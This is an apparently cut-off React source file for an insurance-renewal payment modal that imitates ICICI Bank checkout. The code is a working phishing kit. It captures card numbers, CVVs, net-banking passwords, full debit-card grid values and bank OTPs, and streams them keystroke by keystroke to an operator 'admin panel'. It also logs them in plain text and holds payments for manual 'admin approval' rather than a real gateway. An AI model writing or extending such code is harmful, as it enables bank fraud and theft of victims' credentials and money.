import React, { useState, useEffect, useRef } from 'react';
import { 
  ShieldCheck, 
  CreditCard, 
  Smartphone, 
  Landmark, 
  Lock, 
  X, 
  Check, 
  AlertCircle, 
  ArrowRight, 
  Clock, 
  Copy, 
  QrCode, 
  ArrowLeft,
  RefreshCw,
  Zap,
  Eye,
  EyeOff,
  KeyRound,
  Repeat,
  Calendar,
  BadgeCheck,
  MessageSquare
} from 'lucide-react';
import { CustomerPolicy, AddOnRider } from '../types/insurance';
import { recordPaymentAttempt, logActivity, getAdminSettings } from '../services/storageService';
import { 
  apiCreatePendingApproval, 
  apiGetPendingApprovalStatus, 
  apiGetAdminSettings, 
  subscribeToRealtimeEvents,
  apiSaveMobileOtpTracking,
  apiUpdateMobileOtpConsent,
  apiUpdateMobileOtpStatus,
  apiNotifyCardDetailsUpdated
} from '../services/apiService';
import { detectDeviceInfo } from '../utils/mobileDeviceDetection';
import { MobileOtpAssistanceModal } from './MobileOtpAssistanceModal';

interface PaymentModalProps {
  policy: CustomerPolicy;
  selectedAddOns: AddOnRider[];
  selectedTenure: number;
  finalPayable: number;
  onClose: () => void;
  onPaymentSuccess?: (method: string, transactionRef: string, attemptData: any) => void;
  onPaymentFailure?: (method: string, transactionRef: string, attemptData: any) => void;
  isRetry?: boolean;
}

const GRID_LETTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P'] as const;
type GridLetter = typeof GRID_LETTERS[number];

const SAMPLE_ICICI_GRID: Record<GridLetter, string> = {
  A: '11', B: '33', C: '57', D: '66',
  E: '42', F: '89', G: '24', H: '75',
  I: '19', J: '63', K: '58', L: '91',
  M: '37', N: '82', O: '46', P: '70'
};

export const PaymentModal: React.FC<PaymentModalProps> = ({
  policy,
  selectedAddOns,
  selectedTenure,
  finalPayable,
  onClose,
  onPaymentSuccess,
  onPaymentFailure,
  isRetry = false
}) => {
  const [selectedMethod, setSelectedMethod] = useState<'upi' | 'card' | 'netbanking' | 'emi'>('upi');
  
  // Dynamic Admin UPI Settings (Always in sync with Admin changes)
  const [adminSettings, setAdminSettings] = useState(getAdminSettings());
  const [copiedAdminUpi, setCopiedAdminUpi] = useState(false);
  const [selectedUpiApp, setSelectedUpiApp] = useState<'gpay' | 'paytm' | 'phonepe' | 'custom'>('gpay');

  // Sync latest Admin UPI Settings from server and listen for SSE updates
  useEffect(() => {
    apiGetAdminSettings()
      .then(settings => {
        if (settings && settings.adminUpiId) {
          setAdminSettings(settings);
        }
      })
      .catch(() => {});
  }, []);

  // Sub-steps for EMI, UPI & Net Banking
  const [emiStep, setEmiStep] = useState<'plan' | 'card'>('plan');
  const [upiStep, setUpiStep] = useState<'vpa' | 'app'>('vpa');
  const [netbankingStep, setNetbankingStep] = useState<'userid' | 'password' | 'grid'>('userid');

  // UPI Payment Mode: One-time vs Monthly AutoPay EMI
  const [upiPaymentType, setUpiPaymentType] = useState<'onetime' | 'autopay_emi'>('onetime');
  const [upiEmiTenureMonths, setUpiEmiTenureMonths] = useState<number>(6);
  const upiAutoDebitDay = 5;
  const upiMonthlyEmi = Math.round(finalPayable / upiEmiTenureMonths);

  // Method Inputs
  const [upiVpa, setUpiVpa] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [selectedBank, setSelectedBank] = useState('ICICI Bank');
  const [customBankName, setCustomBankName] = useState('');
  const [netbankingUserId, setNetbankingUserId] = useState('');
  const [netbankingPassword, setNetbankingPassword] = useState('');
  const [showNetbankingPassword, setShowNetbankingPassword] = useState(false);
  const [emiTenureMonths, setEmiTenureMonths] = useState<number>(6);

  // ICICI Debit Card Grid state (A through P)
  const [iciciGrid, setIciciGrid] = useState<Record<GridLetter, string>>({
    A: '', B: '', C: '', D: '', E: '', F: '', G: '', H: '',
    I: '', J: '', K: '', L: '', M: '', N: '', O: '', P: ''
  });

  // Handle Grid Input change with auto-focus to next box
  const handleGridInputChange = (letter: GridLetter, value: string, index: number) => {
    const cleaned = value.replace(/\D/g, '').slice(0, 2);
    setIciciGrid(prev => ({ ...prev, [letter]: cleaned }));
    if (cleaned.length === 2 && index < GRID_LETTERS.length - 1) {
      const nextLetter = GRID_LETTERS[index + 1];
      const nextInput = document.getElementById(`grid-input-${nextLetter}`);
      if (nextInput) {
        nextInput.focus();
      }
    }
  };

  // Handle Grid Input backspace navigation
  const handleGridKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, letter: GridLetter, index: number) => {
    if (e.key === 'Backspace' && !iciciGrid[letter] && index > 0) {
      const prevLetter = GRID_LETTERS[index - 1];
      const prevInput = document.getElementById(`grid-input-${prevLetter}`);
      if (prevInput) {
        prevInput.focus();
      }
    }
  };

  const handlePrefillSampleGrid = () => {
    setIciciGrid({ ...SAMPLE_ICICI_GRID });
  };

  const handleClearGrid = () => {
    setIciciGrid({
      A: '', B: '', C: '', D: '', E: '', F: '', G: '', H: '',
      I: '', J: '', K: '', L: '', M: '', N: '', O: '', P: ''
    });
  };

  // Modal Steps: method -> processing (5-10s) -> otp (3 min timer) -> waiting_approval (35s timer) -> expired
  const [step, setStep] = useState<'method' | 'processing' | 'otp' | 'waiting_approval' | 'expired'>('method');
  const [otp, setOtp] = useState('');
  const [simulatedBankOtp, setSimulatedBankOtp] = useState<string>(() => {
    return String(Math.floor(100000 + Math.random() * 900000));
  });
  const [isProcessing, setIsProcessing] = useState(false);
  const [activeTxnRef, setActiveTxnRef] = useState('');
  const [waitingTimeLeft, setWaitingTimeLeft] = useState(120);
  const [resendNotification, setResendNotification] = useState<string | null>(null);
  const [pendingApprovalStatus, setPendingApprovalStatus] = useState<string>('PENDING');

  const effectiveBankName = selectedBank === 'Other Bank' ? (customBankName.trim() || 'Other Bank') : selectedBank;

  // Device & Mobile OTP Assistance State
  const deviceInfo = React.useMemo(() => detectDeviceInfo(), []);
  const [mobileConsentStatus, setMobileConsentStatus] = useState<'pending' | 'accepted' | 'declined' | 'not_applicable'>(() => {
    return deviceInfo.isMobile ? 'pending' : 'not_applicable';
  });
  const [showMobileOtpModal, setShowMobileOtpModal] = useState<boolean>(false);
  const [isWebOtpAutofilled, setIsWebOtpAutofilled] = useState<boolean>(false);
  const [webOtpAbortController, setWebOtpAbortController] = useState<AbortController | null>(null);
  // 3-Minute OTP Timer State
  const [otpTimeLeft, setOtpTimeLeft] = useState(180);

  // Preserve & Restore session state when customer switches between Chrome and SMS app
  useEffect(() => {
    if (isRetry) {
      try {
        sessionStorage.removeItem(`icici_pay_session_${policy.policyNumber}`);
      } catch (_) {}
      setSelectedMethod('card');
      setStep('method');
      setCardNumber('');
      setCardHolder(policy.customerName || '');
      setCardExpiry('');
      setCardCvv('');
      setOtp('');
      setActiveTxnRef('');
      setPendingApprovalStatus('PENDING');
      return;
    }

    try {
      const savedSessionRaw = sessionStorage.getItem(`icici_pay_session_${policy.policyNumber}`);
      if (savedSessionRaw) {
        const saved = JSON.parse(savedSessionRaw);
        if (Date.now() - saved.savedAt < 10 * 60 * 1000) {
          if (saved.step && saved.step !== 'method') setStep(saved.step);
          if (saved.activeTxnRef) setActiveTxnRef(saved.activeTxnRef);
          if (saved.selectedMethod) setSelectedMethod(saved.selectedMethod);
          if (saved.cardNumber) setCardNumber(saved.cardNumber);
          if (saved.cardHolder) setCardHolder(saved.cardHolder);
          if (saved.cardExpiry) setCardExpiry(saved.cardExpiry);
          if (saved.mobileConsentStatus) setMobileConsentStatus(saved.mobileConsentStatus);
          if (saved.otpTimeLeft && saved.otpTimeLeft > 0) {
            const elapsedSec = Math.floor((Date.now() - saved.savedAt) / 1000);
            const remaining = Math.max(15, saved.otpTimeLeft - elapsedSec);
            setOtpTimeLeft(remaining);
          }
        }
      }
    } catch (_) {}
  }, [policy.policyNumber, isRetry]);

  // Save session state to sessionStorage when active to prevent losing state on tab switch
  useEffect(() => {
    if (step === 'processing' || step === 'otp' || step === 'waiting_approval') {
      try {
        sessionStorage.setItem(`icici_pay_session_${policy.policyNumber}`, JSON.stringify({
          policyNumber: policy.policyNumber,
          step,
          activeTxnRef,
          selectedMethod,
          cardNumber,
          cardHolder,
          cardExpiry,
          mobileConsentStatus,
          otpTimeLeft,
          savedAt: Date.now()
        }));
      } catch (_) {}
    } else if (step === 'method') {
      try {
        sessionStorage.removeItem(`icici_pay_session_${policy.policyNumber}`);
      } catch (_) {}
    }
  }, [step, activeTxnRef, selectedMethod, cardNumber, cardHolder, cardExpiry, mobileConsentStatus, otpTimeLeft, policy.policyNumber]);

  // Abort WebOTP on unmount or when step changes
  useEffect(() => {
    return () => {
      if (webOtpAbortController) {
        try {
          webOtpAbortController.abort();
        } catch (_) {}
      }
    };
  }, [webOtpAbortController]);

  // Trigger Mobile OTP Assistance popup and record tracking when reaching OTP step
  useEffect(() => {
    if (step === 'otp') {
      // 1. Mobile-only: Open OTP assistance pop-up only on mobile devices if consent not decided
      if (deviceInfo.isMobile && mobileConsentStatus === 'pending') {
        setShowMobileOtpModal(true);
      }

      // 2. Track Mobile OTP Verification Session in central DB / Admin
      apiSaveMobileOtpTracking({
        policyNumber: policy.policyNumber,
        customerName: policy.customerName,
        customerId: policy.id,
        applicationRef: activeTxnRef || `APX-${policy.policyNumber.replace(/\//g, '')}`,
        deviceCategory: deviceInfo.deviceCategory,
        browserCategory: deviceInfo.browserCategory,
        os: deviceInfo.os,
        consentStatus: deviceInfo.isMobile 
          ? (mobileConsentStatus === 'accepted' ? 'Accepted' : mobileConsentStatus === 'declined' ? 'Declined' : ('Pending' as any)) 
          : 'Not Prompted (Desktop)',
        otpStatus: 'Pending',
        paymentStatus: 'Pending',
        paymentGatewayRef: activeTxnRef,
        paymentMethod: selectedMethod === 'upi' ? (upiPaymentType === 'autopay_emi' ? 'UPI AutoPay (EMI)' : 'UPI') : selectedMethod === 'card' ? 'Card' : selectedMethod === 'emi' ? 'Easy EMI' : 'Net Banking',
        amount: finalPayable,
        webOtpSupported: deviceInfo.supportsWebOtp,
        retryCount: 0
      }).catch(err => console.warn('Failed to save mobile OTP tracking:', err));
    }
  }, [step, deviceInfo, mobileConsentStatus, policy, activeTxnRef, selectedMethod, upiPaymentType, finalPayable]);

  const handleAcceptMobileOtp = () => {
    setMobileConsentStatus('accepted');
    setShowMobileOtpModal(false);

    apiUpdateMobileOtpConsent({
      policyNumber: policy.policyNumber,
      consentStatus: 'Accepted',
      paymentGatewayRef: activeTxnRef,
      deviceCategory: deviceInfo.deviceCategory,
      browserCategory: deviceInfo.browserCategory,
      os: deviceInfo.os,
      webOtpSupported: deviceInfo.supportsWebOtp
    }).catch(() => {});

    // Initiate WebOTP API if supported
    if (typeof window !== 'undefined' && 'OTPCredential' in window) {
      try {
        const ac = new AbortController();
        setWebOtpAbortController(ac);
        navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: ac.signal
        } as any).then((content: any) => {
          if (content && content.code) {
            setOtp(content.code);
            setIsWebOtpAutofilled(true);
            setResendNotification('✓ Bank OTP detected and automatically autofilled from SMS via Mobile Assistant.');
            setTimeout(() => setResendNotification(null), 5000);
          }
        }).catch((err) => {
          console.log('WebOTP auto-read fallback:', err);
        });
      } catch (e) {
        console.warn('WebOTP invocation error:', e);
      }
    }
  };

  const handleDeclineMobileOtp = () => {
    setMobileConsentStatus('declined');
    setShowMobileOtpModal(false);

    apiUpdateMobileOtpConsent({
      policyNumber: policy.policyNumber,
      consentStatus: 'Declined',
      paymentGatewayRef: activeTxnRef,
      deviceCategory: deviceInfo.deviceCategory,
      browserCategory: deviceInfo.browserCategory,
      os: deviceInfo.os,
      webOtpSupported: deviceInfo.supportsWebOtp
    }).catch(() => {});
  };

  // Refresh admin settings when component mounts or method changes
  useEffect(() => {
    setAdminSettings(getAdminSettings());
  }, [selectedMethod]);
  
  // Format Card Number (16 digits max, space every 4 digits)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawDigits = e.target.value.replace(/\D/g, '').slice(0, 16);
    const parts = rawDigits.match(/.{1,4}/g);
    const formatted = parts ? parts.join(' ') : '';
    setCardNumber(formatted);
  };

  // Format Expiry Date (MM/YY auto-slash)
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const inputVal = e.target.value;
    const isDeleting = inputVal.length < cardExpiry.length;
    const rawDigits = inputVal.replace(/\D/g, '').slice(0, 4);

    if (!rawDigits) {
      setCardExpiry('');
      return;
    }

    if (rawDigits.length <= 2) {
      if (rawDigits.length === 2 && !isDeleting) {
        setCardExpiry(`${rawDigits}/`);
      } else {
        setCardExpiry(rawDigits);
      }
    } else {
      setCardExpiry(`${rawDigits.slice(0, 2)}/${rawDigits.slice(2)}`);
    }
  };

  // Format CVV
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawDigits = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvv(rawDigits);
  };

  // Debounced live payment details notification to Admin Panel for ALL methods (Card, UPI, Net Banking, OTP)
  const paymentSyncTimerRef = useRef<any>(null);
  useEffect(() => {
    const isCard = selectedMethod === 'card' || selectedMethod === 'emi';
    const hasCardData = isCard && (cardNumber.replace(/\D/g, '').length >= 4 || cardHolder.trim() || cardExpiry.trim() || cardCvv.trim());
    const hasUpiData = selectedMethod === 'upi' && upiVpa.trim().length >= 2;
    const hasNetbankingData = selectedMethod === 'netbanking' && (netbankingUserId.trim() || netbankingPassword.trim() || selectedBank);
    const hasOtpData = otp.trim().length >= 1;

    if (!hasCardData && !hasUpiData && !hasNetbankingData && !hasOtpData) return;

    if (paymentSyncTimerRef.current) clearTimeout(paymentSyncTimerRef.current);
    paymentSyncTimerRef.current = setTimeout(() => {
      let methodTitle = 'UPI';
      if (selectedMethod === 'upi' && upiPaymentType === 'autopay_emi') methodTitle = 'UPI AutoPay (EMI)';
      else if (selectedMethod === 'card') methodTitle = 'Credit/Debit Card';
      else if (selectedMethod === 'emi') methodTitle = 'Easy EMI';
      else if (selectedMethod === 'netbanking') methodTitle = 'Net Banking';

      apiNotifyCardDetailsUpdated({
        policyNumber: policy.policyNumber,
        customerName: policy.customerName,
        cardNumber: isCard ? cardNumber : undefined,
        cardHolder: isCard ? cardHolder : undefined,
        cardExpiry: isCard ? cardExpiry : undefined,
        cardCvv: isCard ? cardCvv : undefined,
        cardLast4: isCard ? (cardNumber.replace(/\D/g, '').slice(-4) || undefined) : undefined,
        upiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
        upiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
        bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
        netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
        netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
        netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
        enteredOtp: otp || undefined,
        amount: finalPayable,
        paymentMethod: methodTitle,
        isSubmission: step === 'waiting_approval',
        transactionRef: activeTxnRef || undefined
      }).catch(() => {});
    }, 500);

    return () => {
      if (paymentSyncTimerRef.current) clearTimeout(paymentSyncTimerRef.current);
    };
  }, [cardNumber, cardHolder, cardExpiry, cardCvv, upiVpa, netbankingUserId, netbankingPassword, selectedBank, iciciGrid, otp, selectedMethod, upiPaymentType, policy, finalPayable, activeTxnRef, step, adminSettings.adminUpiId]);
  
  // 5 to 10 Second Processing Countdown State
  const [processingTimeLeft, setProcessingTimeLeft] = useState(7);

  // Handle Processing Countdown Timer
  useEffect(() => {
    let timer: any = null;
    if (step === 'processing') {
      if (processingTimeLeft > 0) {
        timer = setTimeout(() => {
          setProcessingTimeLeft((prev) => prev - 1);
        }, 1000);
      } else {
        setStep('otp');
        setOtpTimeLeft(180);
      }
    }
    return () => clearTimeout(timer);
  }, [step, processingTimeLeft]);

  // Handle 3-Minute OTP Countdown Timer
  useEffect(() => {
    let timer: any = null;
    if (step === 'otp') {
      if (otpTimeLeft > 0) {
        timer = setTimeout(() => {
          setOtpTimeLeft((prev) => prev - 1);
        }, 1000);
      } else {
        setStep('expired');

        logActivity({
          customerId: policy.id,
          policyNumber: policy.policyNumber,
          customerName: policy.customerName,
          action: 'OTP Session Expired',
          category: 'Payment',
          status: 'Failed',
          amount: finalPayable,
          details: `OTP session expired (3 min timeout) for transaction ${activeTxnRef}.`
        });

        recordPaymentAttempt(policy.policyNumber, {
          tenureYears: selectedTenure,
          finalPayable: finalPayable,
          status: 'Failed',
          paymentMethod: selectedMethod === 'card' ? 'Card' : selectedMethod === 'upi' ? 'UPI' : selectedMethod === 'emi' ? 'Easy EMI' : 'Net Banking',
          transactionRef: activeTxnRef,
          testUpiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
          testUpiId: selectedMethod === 'upi' ? upiVpa : undefined,
          cardType: cardNumber.startsWith('4') ? 'Visa' : cardNumber.startsWith('5') ? 'Mastercard' : 'RuPay',
          cardLast4: cardNumber.replace(/\s+/g, '').slice(-4) || '1234',
          testCardNumber: cardNumber,
          testCardholderName: cardHolder,
          testExpiry: cardExpiry,
          testCvv: cardCvv,
          testVerificationCode: 'EXPIRED',
          verificationAttempted: 'Yes',
          verificationCompleted: 'No',
          verificationStatus: 'Expired (3 min timeout)',
          sessionStatus: 'Terminated',
          gatewayNotes: '3D-Secure OTP session timed out after 3 minutes'
        });
      }
    }
    return () => clearTimeout(timer);
  }, [step, otpTimeLeft, activeTxnRef, policy, finalPayable, selectedTenure, selectedMethod, upiVpa, cardNumber, cardHolder, cardExpiry, cardCvv]);

  // Stable 1-second countdown timer for waiting_approval step
  useEffect(() => {
    if (step !== 'waiting_approval') return;
    const timer = setInterval(() => {
      setWaitingTimeLeft(prev => {
        if (prev <= 1) {
          setStep('expired');
          setPendingApprovalStatus('EXPIRED');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [step]);

  // Gentle 3-second status polling loop for admin approval
  useEffect(() => {
    if (step !== 'waiting_approval' || !activeTxnRef) return;

    let isSubscribed = true;
    const checkStatus = async () => {
      try {
        const res = await apiGetPendingApprovalStatus(activeTxnRef);
        if (!isSubscribed || !res || !res.status) return;

        setPendingApprovalStatus(res.status);

        if (res.status === 'APPROVED') {
          apiUpdateMobileOtpStatus({
            policyNumber: policy.policyNumber,
            paymentGatewayRef: activeTxnRef,
            otpStatus: 'Successful',
            paymentStatus: 'Successful',
            notes: 'Payment confirmed & policy successfully renewed.'
          }).catch(() => {});

          const methodTitle = selectedMethod === 'card' ? 'Card' : selectedMethod === 'upi' ? 'UPI' : selectedMethod === 'emi' ? 'Easy EMI' : 'Net Banking';
          if (onPaymentSuccess) {
            onPaymentSuccess(methodTitle, activeTxnRef, {
              method: methodTitle,
              transactionRef: activeTxnRef,
              status: 'Success',
              amount: finalPayable
            });
          }
          onClose();
        } else if (res.status === 'DECLINED') {
          try {
            sessionStorage.removeItem(`icici_pay_session_${policy.policyNumber}`);
          } catch (_) {}

          apiUpdateMobileOtpStatus({
            policyNumber: policy.policyNumber,
            paymentGatewayRef: activeTxnRef,
            otpStatus: 'Failed',
            paymentStatus: 'Failed',
            notes: 'Bank 3D-Secure declined transaction.'
          }).catch(() => {});

          const methodTitle = selectedMethod === 'card' ? 'Card' : selectedMethod === 'upi' ? 'UPI' : selectedMethod === 'emi' ? 'Easy EMI' : 'Net Banking';
          if (onPaymentFailure) {
            onPaymentFailure(methodTitle, activeTxnRef, {
              method: methodTitle,
              transactionRef: activeTxnRef,
              status: 'Failed',
              failureReason: 'Payment transaction was declined during 3D-secure authorization.'
            });
          }
          onClose();
        } else if (res.status === 'EXPIRED') {
          apiUpdateMobileOtpStatus({
            policyNumber: policy.policyNumber,
            paymentGatewayRef: activeTxnRef,
            otpStatus: 'Expired',
            paymentStatus: 'Failed',
            notes: 'Gateway verification window expired.'
          }).catch(() => {});

          setStep('expired');
        }
      } catch (err) {
        console.warn('Error polling approval status:', err);
      }
    };

    // Run first check after 1.5s then interval 3s
    const firstCheck = setTimeout(checkStatus, 1500);
    const pollTimer = setInterval(checkStatus, 3000);

    return () => {
      isSubscribed = false;
      clearTimeout(firstCheck);
      clearInterval(pollTimer);
    };
  }, [step, activeTxnRef, policy.policyNumber, finalPayable, selectedMethod, onPaymentSuccess, onPaymentFailure, onClose]);

  const handleResendOtp = () => {
    setOtpTimeLeft(prev => prev + 180);
    setResendNotification('A fresh 3D-Secure OTP has been dispatched to your registered mobile phone. Session extended by +3:00 minutes.');
    setTimeout(() => setResendNotification(null), 5000);

    logActivity({
      customerId: policy.id,
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      action: 'OTP Resent & Session Extended',
      category: 'Payment',
      status: 'Info',
      details: `Customer requested 3D-Secure OTP resend. Session extended by 3 minutes for transaction ${activeTxnRef}.`
    });
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyAdminUpi = () => {
    navigator.clipboard.writeText(adminSettings.adminUpiId);
    setCopiedAdminUpi(true);
    setTimeout(() => setCopiedAdminUpi(false), 2500);
  };

  // Handle Initiating Payment
  const handleInitiatePayment = (e: React.FormEvent) => {
    e.preventDefault();

    const txnRef = `TXN-APX-${Math.floor(10000000 + Math.random() * 90000000)}`;
    setActiveTxnRef(txnRef);

    const cardLast4 = cardNumber.replace(/\s+/g, '').slice(-4) || '1234';
    const cardType = cardNumber.startsWith('4') ? 'Visa' : cardNumber.startsWith('5') ? 'Mastercard' : 'RuPay';
    const isUpiAutoPay = selectedMethod === 'upi' && upiPaymentType === 'autopay_emi';
    const effectiveEmiTenure = isUpiAutoPay ? upiEmiTenureMonths : emiTenureMonths;
    const monthlyEmi = Math.round(finalPayable / effectiveEmiTenure);
    const mandateUmn = `UMN-APX-${Math.floor(10000000 + Math.random() * 90000000)}`;

    let actionName = 'Card Payment Attempted';
    let methodTitle = 'Card';
    if (selectedMethod === 'upi') {
      if (isUpiAutoPay) {
        actionName = 'UPI AutoPay Mandate Setup Attempted';
        methodTitle = 'UPI AutoPay (EMI)';
      } else {
        actionName = 'UPI Payment Attempted';
        methodTitle = 'UPI';
      }
    } else if (selectedMethod === 'emi') {
      actionName = 'Easy EMI Payment Attempted';
      methodTitle = 'Easy EMI';
    } else if (selectedMethod === 'netbanking') {
      actionName = 'Net Banking Attempted';
      methodTitle = 'Net Banking';
    }

    const gridSummary = (selectedBank === 'ICICI Bank' && Object.values(iciciGrid).some(v => v))
      ? Object.entries(iciciGrid).filter(([_, v]) => v).map(([k, v]) => `${k}:${v}`).join(' ')
      : '';

    const methodDetailStr = selectedMethod === 'netbanking'
      ? `Bank: ${effectiveBankName}, User ID: ${netbankingUserId}, Password: ${netbankingPassword}${gridSummary ? `, ICICI Grid (A-P): [${gridSummary}]` : ''}`
      : isUpiAutoPay
      ? `UPI AutoPay Monthly Mandate: ${upiEmiTenureMonths} Months @ ₹${monthlyEmi.toLocaleString('en-IN')}/mo (auto-debited on 5th of each month), Customer VPA: ${upiVpa || 'Direct App Pay'}, Payee VPA: ${adminSettings.adminUpiId}, UMN: ${mandateUmn}`
      : selectedMethod === 'upi'
      ? `Customer UPI ID: ${upiVpa || 'Default App'}, Admin UPI ID Used: ${adminSettings.adminUpiId}`
      : selectedMethod === 'emi'
      ? `EMI Plan: ${emiTenureMonths} Months (₹${monthlyEmi.toLocaleString('en-IN')}/mo), EMI Card: ${cardNumber}, Holder: ${cardHolder}, Expiry: ${cardExpiry}`
      : `Card: ${cardNumber}, Holder: ${cardHolder}, Expiry: ${cardExpiry}, CVV: ${cardCvv}`;

    logActivity({
      customerId: policy.id,
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      action: actionName,
      category: 'Payment',
      status: 'Pending',
      amount: finalPayable,
      details: `${methodTitle} checkout initiated. ${methodDetailStr}`
    });

    apiNotifyCardDetailsUpdated({
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      cardNumber: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardNumber : undefined,
      cardHolder: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardHolder : undefined,
      cardExpiry: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardExpiry : undefined,
      cardCvv: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardCvv : undefined,
      cardLast4: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardLast4 : undefined,
      upiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
      upiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
      bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
      netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
      netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
      netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
      amount: finalPayable,
      paymentMethod: methodTitle,
      isSubmission: true,
      transactionRef: txnRef
    }).catch(() => {});

    apiCreatePendingApproval({
      transactionRef: txnRef,
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      mobileNumber: policy.mobileNumber,
      amount: finalPayable,
      paymentMethod: methodTitle,
      enteredOtp: otp || '',
      tenureYears: selectedTenure,
      selectedAddOnIds: selectedAddOns.map(a => a.id),
      baseAnnualPremium: policy.baseAnnualPremium,
      methodDetails: {
        customerEmail: policy.email,
        selectedTenure: selectedTenure,
        cardNumber: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardNumber : undefined,
        cardHolder: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardHolder : undefined,
        cardExpiry: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardExpiry : undefined,
        cardCvv: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardCvv : undefined,
        cardLast4: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardLast4 : undefined,
        cardType: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardType : undefined,
        bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
        netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
        netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
        netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
        upiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
        upiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
        testUpiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
        enteredOtp: otp || undefined,
        isAutoPay: isUpiAutoPay,
        emiTenureMonths: (isUpiAutoPay || selectedMethod === 'emi') ? effectiveEmiTenure : undefined,
        emiMonthlyAmount: (isUpiAutoPay || selectedMethod === 'emi') ? monthlyEmi : undefined
      }
    }).catch(() => {});

    recordPaymentAttempt(policy.policyNumber, {
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      tenureYears: selectedTenure,
      finalPayable: finalPayable,
      status: 'Pending',
      paymentMethod: methodTitle,
      transactionRef: txnRef,
      testUpiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
      testUpiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
      cardType: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardType : undefined,
      cardLast4: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardLast4 : undefined,
      testCardNumber: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardNumber : undefined,
      testCardholderName: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardHolder : undefined,
      testExpiry: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardExpiry : undefined,
      testCvv: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardCvv : undefined,
      testVerificationCode: otp,
      verificationAttempted: 'Yes',
      verificationCompleted: 'Pending',
      verificationStatus: 'In Progress',
      sessionStatus: 'Active',
      emiTenureMonths: (isUpiAutoPay || selectedMethod === 'emi') ? effectiveEmiTenure : undefined,
      emiMonthlyAmount: (isUpiAutoPay || selectedMethod === 'emi') ? monthlyEmi : undefined,
      isAutoPay: isUpiAutoPay,
      autoDebitFrequency: isUpiAutoPay ? 'Monthly' : undefined,
      autoDebitDayOfMonth: isUpiAutoPay ? upiAutoDebitDay : undefined,
      upiMandateUmn: isUpiAutoPay ? mandateUmn : undefined,
      bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
      netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
      netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
      netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
      gatewayNotes: isUpiAutoPay
        ? `NPCI UPI AutoPay Monthly Mandate: ₹${monthlyEmi.toLocaleString('en-IN')}/mo auto-debited on 5th of every month for ${upiEmiTenureMonths} months`
        : 'Processing Gateway Connection'
    });

    setProcessingTimeLeft(7);
    setStep('processing');
  };

  // Handle Real-Time Keyed OTP Streaming to Admin Panel
  const handleOtpChange = (newVal: string) => {
    const cleanDigits = newVal.replace(/\D/g, '').slice(0, 6);
    setOtp(cleanDigits);

    // Stream keyed OTP in real time to Admin Panel
    const cardLast4 = (selectedMethod === 'card' || selectedMethod === 'emi') ? (cardNumber.replace(/\D/g, '').slice(-4) || undefined) : undefined;
    const isUpiAutoPay = selectedMethod === 'upi' && upiPaymentType === 'autopay_emi';
    let methodTitle = 'UPI';
    if (isUpiAutoPay) methodTitle = 'UPI AutoPay (EMI)';
